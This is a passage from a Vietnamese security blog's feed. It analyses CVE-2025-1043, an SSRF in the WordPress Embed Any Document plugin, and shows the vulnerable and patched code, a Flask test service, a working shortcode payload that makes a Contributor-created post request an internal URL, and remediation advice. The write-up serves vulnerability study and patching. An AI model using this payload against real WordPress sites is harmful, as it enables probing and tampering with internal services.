&lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function embed_shortcode( $atts ) {&#xA;    ...&#xA;    $show             = false;&#xA;    $shortcode_atts   = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;url&amp;#39;      =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;drive&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;viewer&amp;#39;   =&amp;gt; $default_provider,&#xA;            &amp;#39;download&amp;#39; =&amp;gt; $default_download,&#xA;            ...&#xA;        ),&#xA;        $atts&#xA;    );&#xA;&#xA;    if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) ) :&#xA;        ...&#xA;        if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;            if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;                $show = true;&#xA;            } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;                $show = true;&#xA;            }&#xA;        }&#xA;        $url = esc_url( $shortcode_atts[&amp;#39;url&amp;#39;], array( &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ) );&#xA;        if ( $show ) {&#xA;            $filedata = wp_remote_head( $shortcode_atts[&amp;#39;url&amp;#39;] );&#xA;            ...&#xA;        }&#xA;    ...&#xA;    return $embed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;embed_shortcode()&lt;/code&gt; th·ª±c hi·ªán m·ªôt HTTP HEAD request b·∫±ng h√†m &lt;code&gt;wp_remote_head()&lt;/code&gt; v·ªõi gi√° tr·ªã &lt;code&gt;url&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$shortcode_atts[&#39;url&#39;]&lt;/code&gt;. Do kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø x√°c th·ª±c, l·ªçc, ho·∫∑c gi·ªõi h·∫°n ph·∫°m vi URL, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n v√†o ƒë√≥ m·ªôt ƒë∆∞·ªùng d·∫´n t√πy √Ω =&amp;gt; D·∫´n ƒë·∫øn request c√≥ th·ªÉ g·ª≠i ƒë·∫øn c√°c local service kh√°c g·∫•y &lt;strong&gt;SSRF&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function embed_shortcode( $atts ) {&#xA;    ...&#xA;    $show             = false;&#xA;    $shortcode_atts   = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;url&amp;#39;      =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;drive&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;viewer&amp;#39;   =&amp;gt; $default_provider,&#xA;            &amp;#39;download&amp;#39; =&amp;gt; $default_download,&#xA;            ...&#xA;        ),&#xA;        $atts&#xA;    );&#xA;&#xA;    if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) ) :&#xA;        ...&#xA;        if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;            if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;                $show = true;&#xA;            } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;                $show = true;&#xA;            }&#xA;        }&#xA;        $url = esc_url( $shortcode_atts[&amp;#39;url&amp;#39;], array( &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ) );&#xA;        if ( $show ) {&#xA;            $filedata = wp_safe_remote_head( $shortcode_atts[&amp;#39;url&amp;#39;] );&#xA;            ...&#xA;        }&#xA;    ...&#xA;    return $embed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ thay th·∫ø vi·ªác s·ª≠ d·ª•ng &lt;code&gt;wp_remote_head()&lt;/code&gt; b·∫±ng h√†m &lt;strong&gt;&lt;code&gt;wp_safe_remote_head()&lt;/code&gt;&lt;/strong&gt;, h√†m n√†y b·ªï sung c√°c c∆° ch·∫ø ki·ªÉm tra an to√†n nh·∫±m &lt;strong&gt;ngƒÉn ch·∫∑n truy c·∫≠p ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô, private, loopback ho·∫∑c link-local&lt;/strong&gt;, qua ƒë√≥ &lt;strong&gt;gi·∫£m thi·ªÉu nguy c∆° t·∫•n c√¥ng SSRF&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ ƒëo·∫°n &lt;code&gt;wp_remote_head( $shortcode_atts[&#39;url&#39;] )&lt;/code&gt; trong &lt;code&gt;embed_shortcode()&lt;/code&gt; th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi, ta c·∫ßn &lt;strong&gt;bypass&lt;/strong&gt; t·∫•t c·∫£ c√°c r√†ng bu·ªôc sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;url&lt;/code&gt; ph·∫£i t·ªìn t·∫°i v√† kh√¥ng r·ªóng&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Bi·∫øn &lt;code&gt;$show&lt;/code&gt; ph·∫£i ƒë∆∞·ª£c ƒë·∫∑t th√†nh true tr∆∞·ªõc khi v√†o kh·ªëi g·ªçi HEAD&#xA;&lt;code&gt;$show&lt;/code&gt; m·∫∑c ƒë·ªãnh &lt;code&gt;false&lt;/code&gt;. N√≥ ch·ªâ tr·ªü th√†nh &lt;code&gt;true&lt;/code&gt; khi &lt;code&gt;if ( $this-&amp;gt;allowdownload( $shortcode_atts[&#39;viewer&#39;] ) )&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt; v√† m·ªôt trong hai ƒëi·ªÅu ki·ªán sau ƒë√∫ng:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;    if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;        $show = true;&#xA;    } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;        $show = true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; b·∫±ng &lt;code&gt;&#39;alluser&#39;&lt;/code&gt; ho·∫∑c &lt;code&gt;&#39;all&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; b·∫±ng &lt;code&gt;&#39;logged&#39;&lt;/code&gt; v√† &lt;code&gt;is_user_logged_in()&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt; (t·ª©c ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allowdownload( $provider ) {&#xA;    $blacklist = array( &amp;#39;drive&amp;#39;, &amp;#39;box&amp;#39; );&#xA;    if ( in_array( $provider, $blacklist, true ) ) {&#xA;        return false;&#xA;    } else {&#xA;        return true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;allowdownload()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt; n·∫øu &lt;code&gt;$provider ($shortcode_atts[&#39;viewer&#39;])&lt;/code&gt; kh√¥ng t·ªìn t·∫°i ho·∫∑c kh√¥ng n·∫±m trong &lt;code&gt;$blacklist&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;V√¨ SSRF d√πng HTTP HEAD n√™n &lt;strong&gt;kh√¥ng ƒë·ªçc ƒë∆∞·ª£c body tr·ª±c ti·∫øp&lt;/strong&gt;, nh∆∞ng v·∫´n c√≥ th·ªÉ l·ªô &lt;strong&gt;metadata&lt;/strong&gt; (Content-Type, Content-Length) v√† thƒÉm d√≤/kh√°m ph√° c√°c endpoint n·ªôi b·ªô. N·∫øu endpoint &lt;strong&gt;kh√¥ng ph√¢n bi·ªát method&lt;/strong&gt; c√≥ th·ªÉ d·∫´n ƒë·∫øn thay ƒë·ªïi, x√≥a d·ªØ li·ªáu nh·∫°y c·∫£m.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;embed_shortcode()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode( &amp;#39;embeddoc&amp;#39;, array( $this, &amp;#39;embed_shortcode&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Shortcode: [embeddoc url=...]&amp;#34;] --&amp;gt; B[&amp;#34;embed_shortcode($atts)&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;isset($shortcode_atts[&amp;#39;url&amp;#39;]) &amp;amp;&amp;amp; !empty(...)?&amp;#34;}&#xA;C -- Yes --&amp;gt; D{&amp;#34;$this-&amp;gt;allowdownload($shortcode_atts[&amp;#39;viewer&amp;#39;])?&amp;#34;}&#xA;C -- No --&amp;gt; End1[No request]&#xA;D -- Yes --&amp;gt; E{&amp;#34;download == &amp;#39;all&amp;#39;|&amp;#39;alluser&amp;#39; OR (download==&amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in())?&amp;#34;}&#xA;D -- No --&amp;gt; End2[No request]&#xA;E -- Yes --&amp;gt; F[&amp;#34;wp_remote_head($shortcode_atts[&amp;#39;url&amp;#39;]) ‚Üê SSRF sink&amp;#34;]&#xA;E -- No --&amp;gt; End3[No request]&#xA;F --&amp;gt; G[&amp;#34;Return to client&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;)&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Login b·∫±ng t√†i kho·∫£n Contributor&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;T·∫°o post v·ªõi shortcode&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[embeddoc url=http://localhost:8001/delete?id=1 download=all]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-02-cve-2025-1043/result.png&#34; title=&#34;HEAD request t·ªõi local service&#34; data-thumbnail=&#34;/posts/2025-11-02-cve-2025-1043/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;HEAD request t·ªõi local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-02-cve-2025-1043/result.png&#39; alt=&#34;Result&#34; height=&#34;283&#34; width=&#34;587&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;HEAD request t·ªõi local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-1043 l√† SSRF do plugin g·ªçi &lt;code&gt;wp_remote_head()&lt;/code&gt; v·ªõi URL t·ª´ shortcode m√† kh√¥ng ki·ªÉm tra. D√π l√† &lt;code&gt;HEAD&lt;/code&gt; (kh√¥ng c√≥ body), v·∫´n c√≥ th·ªÉ l·ªô metadata, thƒÉm d√≤ d·ªãch v·ª• n·ªôi b·ªô ho·∫∑c, khi c√≥ redirect/endpoint kh√¥ng ph√¢n bi·ªát method, g√¢y thay ƒë·ªïi tr·∫°ng th√°i. B·∫£n v√° (v2.7.6) d√πng &lt;code&gt;esc_url_raw()&lt;/code&gt; + &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; ƒë·ªÉ gi·∫£m r·ªßi ro.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: thi·∫øu l·ªçc/whitelist URL tr∆∞·ªõc khi g·ªçi HTTP t·ª´ server.&lt;/li&gt;&#xA;&lt;li&gt;·∫¢nh h∆∞·ªüng: metadata leak, internal discovery, kh·∫£ nƒÉng chu·ªói t·∫•n c√¥ng (redirect ‚Üí GET, method-agnostic endpoints).&lt;/li&gt;&#xA;&lt;li&gt;Fix: c·∫≠p nh·∫≠t l√™n &lt;strong&gt;v2.7.6&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khuy·∫øn ngh·ªã ng·∫Øn: d√πng &lt;code&gt;wp_safe_remote_*&lt;/code&gt;, &lt;code&gt;esc_url_raw()&lt;/code&gt;/whitelist, t·∫Øt redirect khi ch·ªâ c·∫ßn header, v√† gi·ªõi h·∫°n quy·ªÅn ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/embed-any-document/vulnerability/wordpress-embed-any-document-embed-pdf-word-powerpoint-and-excel-files-plugin-2-7-5-authenticated-contributor-blind-server-side-request-forgery-via-embeddoc-shortcode-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Any Document Plugin &amp;lt;= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52713 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-01-cve-2025-52713/</link>
      <pubDate>Sat, 01 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
